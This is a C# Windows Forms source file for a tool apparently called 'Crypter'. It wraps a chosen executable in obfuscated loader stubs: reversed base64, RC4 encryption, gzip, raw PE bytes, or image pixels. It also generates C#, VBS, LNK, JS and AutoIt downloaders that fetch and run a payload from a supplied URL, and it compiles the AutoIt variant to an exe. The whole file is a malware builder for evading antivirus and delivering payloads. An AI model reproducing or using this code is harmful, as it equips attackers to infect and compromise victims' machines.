using System;
using System.Text;
using System.Windows.Forms;
using System.IO;
using Microsoft.VisualBasic;
using Crypter.Properties;
using Microsoft.VisualBasic.CompilerServices;
using System.IO.Compression;
using System.Threading;
using System.Diagnostics;
using Ionic.Zip;
using Crypter;
using System.Drawing;

namespace CrypterExample
{
	public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Executable Files|*.exe;*.dll",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (FOpen.ShowDialog() == DialogResult.OK)
                textBox1.Text = FOpen.FileName;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            string Source = Crypter.Properties.Resources.base64;
            if (textBox1.Text != "")
            {
                byte[] FileBytes = File.ReadAllBytes(textBox1.Text);
                string EncryptedStr = Strings.StrReverse(Convert.ToBase64String(FileBytes));
                Source = Source.Replace("[stub-replace]", EncryptedStr);
                textBox2.Text = Source;
                MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose Windows Application and x86.",
                        "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Please select the file.",
                        "Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }   
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string Source = Crypter.Properties.Resources.VB;
            if (textBox1.Text != "")
            {
                byte[] FileBytes = File.ReadAllBytes(textBox1.Text);
                string EncryptedStr = Strings.StrReverse(Convert.ToBase64String(FileBytes));
                string Encrypted = "\"" + EncryptedStr.Substring(0, 1) + "\"";
                for (int i = 1; i < EncryptedStr.Length; i++)
                {
                    Encrypted = Encrypted + "," + "\r\n" + "\"" + EncryptedStr.Substring(i, 1) + "\"";
                }                
                Source = Source.Replace("[stub-replace]", Encrypted);
                textBox2.Text = Source;
                MessageBox.Show("Copy to VS ; Use .NET Framework VB ; Choose Windows Application.",
                        "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Please select the file.",
                        "Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        

		private void button3_Click(object sender, EventArgs e)
		{

			if (textBox1.Text != "" && textBox3.Text != "")
			{
				byte[] b = File.ReadAllBytes(textBox1.Text);
				string contents = Resources.rc4.Replace("lol", Conversions.ToString(this.Brc4(b))).Replace("kkkkk", textBox3.Text);
				textBox2.Text = contents;
				MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose Windows Application.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please select the file and enter the key.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		public object Brc4(byte[] b2)
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = this.RC4Encrypt(b2);
			foreach (byte value in array)
			{
				stringBuilder.Append(value);
				stringBuilder.Append(",");
			}
			return stringBuilder.ToString().Remove(checked(stringBuilder.Length - 1));
		}

		private byte[] RC4Encrypt(byte[] key)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(textBox3.Text);
			uint[] array = new uint[256];
			checked
			{
				byte[] array2 = new byte[key.Length - 1 + 1];
				uint num = 0U;
				uint num2;
				uint num3;
				do
				{
					array[(int)num] = num;
					num += 1U;
					num2 = num;
					num3 = 255U;
				}
				while (num2 <= num3);
				num = 0U;
				uint num4 = 0;
				uint num6;
				do
				{
					num4 = (uint)(unchecked((ulong)(checked(num4 + (uint)bytes[(int)(unchecked((ulong)num % (ulong)((long)bytes.Length)))] + array[(int)num]))) & 255UL);
					uint num5 = array[(int)num];
					array[(int)num] = array[(int)num4];
					array[(int)num4] = num5;
					num += 1U;
					num6 = num;
					num3 = 255U;
				}
				while (num6 <= num3);
				num = 0U;
				num4 = 0U;
				int num7 = 0;
				int num8 = array2.Length - 1;
				int num9 = num7;
				for (; ; )
				{
					int num10 = num9;
					int num11 = num8;
					if (num10 > num11)
					{
						break;
					}
					num = (uint)(unchecked((ulong)num) + 1UL & 255UL);
					num4 = (uint)(unchecked((ulong)(checked(num4 + array[(int)num]))) & 255UL);
					uint num5 = array[(int)num];
					array[(int)num] = array[(int)num4];
					array[(int)num4] = num5;
					array2[num9] = (byte)((uint)key[num9] ^ array[(int)(unchecked((ulong)(checked(array[(int)num] + array[(int)num4]))) & 255UL)]);
					num9++;
				}
				return array2;
			}
		}

		private void copyToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (textBox2.Text != "")
			{
				Clipboard.SetDataObject(textBox2.Text.Trim());
			}
		}

		private void button5_Click(object sender, EventArgs e)
		{
			
			if (textBox1.Text != "")
			{
				if (textBox4.Text != "")
				{
					string stub = Resources.base64_url.Replace("123456", textBox4.Text);
					textBox2.Text = stub;
				}
				else
				{
					string source = Convert.ToBase64String(File.ReadAllBytes(this.textBox1.Text));
					File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Server.jpg", source);
					Interaction.MsgBox("Create Server.jpg on Desktop", MsgBoxStyle.Information, "Done !!!");
				}
				MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose Windows Application.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please select the file and enter the key.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button6_Click(object sender, EventArgs e)
		{
			if (textBox1.Text != "")
			{
				string source = Convert.ToBase64String(GZip(File.ReadAllBytes(this.textBox1.Text)));
				string stub = Resources.base64_Gzip.Replace("123456", source);
				textBox2.Text = stub;
				MessageBox.Show("Done!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose Windows Application.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please select the file and enter the key.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}

		}
		public static byte[] GZip(byte[] byte_0)
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
				{
					gzipStream.Write(byte_0, 0, byte_0.Length);
					gzipStream.Close();
					byte_0 = new byte[checked(memoryStream.ToArray().Length - 1 + 1 - 1 + 1 - 1 + 1 - 1 + 1)];
					byte_0 = memoryStream.ToArray();
				}
				memoryStream.Close();
			}
			return byte_0;
		}

		private void button7_Click(object sender, EventArgs e)
		{
			string Source = Resources.dll;
			if (textBox1.Text != "")
			{
				byte[] FileBytes = File.ReadAllBytes(textBox1.Text);
				string EncryptedStr = Convert.ToBase64String(FileBytes);
				Source = Source.Replace("123456", EncryptedStr);
				textBox2.Text = Source;
				MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose DLL and x86.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please select the file.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button8_Click(object sender, EventArgs e)
		{
			if (textBox1.Text != "")
			{
				byte[] FileBytes = File.ReadAllBytes(textBox1.Text);
				string Source = "0x"+BitConverter.ToString(FileBytes).Replace("-", ",0x");
				Source = Resources.PEbytes.Replace("123456", Source).Replace("654321", Convert.ToString(FileBytes.Length));
				Source = Source.Replace("0x0", "0x");
				textBox2.Text = Source;
				MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose Windows Application.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please select the file.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button9_Click(object sender, EventArgs e)
		{
			string Source = Resources.CSharp_url;
			if (textBox4.Text != "")
			{
				Source = Source.Replace("123456", textBox4.Text);
				textBox2.Text = Source;
				MessageBox.Show("Copy to VS ; Use .NET Framework 4 ; Choose Windows Application.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please enter the url.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button10_Click(object sender, EventArgs e)
		{
			string Source = Resources.VBS_url;
			if (textBox4.Text != "")
			{
				Source = Source.Replace("123456", textBox4.Text);
				textBox2.Text = Source;
				MessageBox.Show("Copy to txt file and rename to VBS file.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please enter the url.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button11_Click(object sender, EventArgs e)
		{
			string Source = Resources.lnk_url;
			if (textBox4.Text != "")
			{
				Source = Source.Replace("123456", textBox4.Text);
				textBox2.Text = Source;
				MessageBox.Show("Copy to txt file and rename to VBS file .When it runs,it'll creat a lnk file.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please enter the url.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button12_Click(object sender, EventArgs e)
		{
			string Source = Resources.js_url;
			if (textBox4.Text != "")
			{
				Source = Source.Replace("123456", textBox4.Text);
				textBox2.Text = Source;
				MessageBox.Show("Copy to txt file and rename to js file.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please enter the url.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button13_Click(object sender, EventArgs e)
		{
			if (textBox4.Text != "")
			{
				using (SaveFileDialog saveFileDialog = new SaveFileDialog())
				{
					saveFileDialog.Filter = "*.exe|*.exe";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						string text = Path.GetTempPath() + "QWQDANCHUN_Temp";
						if (!Directory.Exists(text))
						{
							Directory.CreateDirectory(text);
						}
						File.WriteAllText(text + "\\Stub.au3", Resources.autoit_url);
						File.WriteAllBytes(text + "\\Include.zip", Resources.Include);
						File.WriteAllBytes(text + "\\Aut2exe.exe", Resources.Aut2exe);
						using (ZipFile zipFile = ZipFile.Read(text + "\\Include.zip"))
						{
							zipFile.ExtractAll(text, ExtractExistingFileAction.OverwriteSilently);
						}
						string text2 = File.ReadAllText(text + "\\Stub.au3");
						text2 = text2.Replace("#URL", textBox4.Text);
						textBox2.Text = text2;

						File.WriteAllText(text + "\\Stub.au3", text2);
						if (File.Exists(saveFileDialog.FileName))
						{
							File.Delete(saveFileDialog.FileName);
						}
						Process.Start(new ProcessStartInfo
						{
							WorkingDirectory = text,
							FileName = "Aut2exe.exe",
							Arguments = "/in Stub.au3 /out " + Path.GetFileName(saveFileDialog.FileName)
						}).WaitForExit(5000);
						File.Copy(text + "\\" + Path.GetFileName(saveFileDialog.FileName), saveFileDialog.FileName);
						Thread.Sleep(2000);
						Directory.Delete(text, true);
						MessageBox.Show("Done",
								"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
					}
				}
			}
			else
			{
				MessageBox.Show("Please enter the url.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			
		}

		private void 打开文件ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			OpenFileDialog FOpen = new OpenFileDialog()
			{
				Filter = "Executable Files|*.exe;*.dll",
				InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
			};

			if (FOpen.ShowDialog() == DialogResult.OK)
				textBox1.Text = FOpen.FileName;
		}

		private void 退出ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		private void 关于ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormAbout formAbout = new FormAbout())
			{
				formAbout.ShowDialog();
			}
		}

		private void 文档ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FormDoc formDoc = new FormDoc())
			{
				formDoc.ShowDialog();
			}
		}

		private void button14_Click(object sender, EventArgs e)
		{
			string filePath = textBox1.Text;
			Bitmap img = pixelate(filePath);
			SaveFileDialog s = new SaveFileDialog();
			s.DefaultExt = "bmp";
			s.Filter = "PNG Files|*.png";
			if (s.ShowDialog() == DialogResult.OK)
			{
				img.Save(s.FileName);
				MessageBox.Show("Upload to web,and copy the link to url.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}
		public static Bitmap pixelate(string filePath)
		{
			Random rnd = new Random();
			string a = Convert.ToBase64String(System.IO.File.ReadAllBytes(filePath));
			char[] aR = a.ToCharArray();
			double sq = Math.Sqrt(aR.Length);
			int autosize = ((int)sq) + 2;
			Bitmap imageholder = new Bitmap(autosize, autosize);
			Graphics g = Graphics.FromImage(imageholder);
			int fff = 0;
			while (fff <= aR.Length - 1)
			{
				for (int y = 1; y <= imageholder.Height - 1; y++)
				{
					for (int x = 1; x <= imageholder.Width - 1; x++)
					{
						if (fff <= aR.Length - 1)
						{
							int green = rnd.Next(0, 255);
							int blue = rnd.Next(0, 255);

							int charCode = aR[fff];
							imageholder.SetPixel(x, y, Color.FromArgb(charCode, 0, 0));
							fff++;
						}
					}
				}
			}
			return imageholder;
		}

		private void button16_Click(object sender, EventArgs e)
		{
			string Source = Resources.imgcrypt;
			if (textBox4.Text != "")
			{
				Source = Source.Replace("123456", textBox4.Text);
				textBox2.Text = Source;
				MessageBox.Show("Copy to VS ; Use .NET Framework 2 ; Choose Windows Application.",
						"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
			else
			{
				MessageBox.Show("Please enter the url.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}

		private void button15_Click(object sender, EventArgs e)
		{
			string Source = Resources.CSharp_js_url;
			if (textBox4.Text != "")
			{
				if (textBox4.Text.Contains("js"))
				{
					Source = Source.Replace("123456", textBox4.Text);
					textBox2.Text = Source;
					MessageBox.Show("Copy to VS ; Use .NET Framework 2 ; Choose Windows Application.",
							"Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
				} 
				else
				{
					MessageBox.Show("Please enter the url of the js by using DotNetToJScript.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
				}				
			}
			else
			{
				MessageBox.Show("Please enter the url.",
						"Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}
		}
	}
}
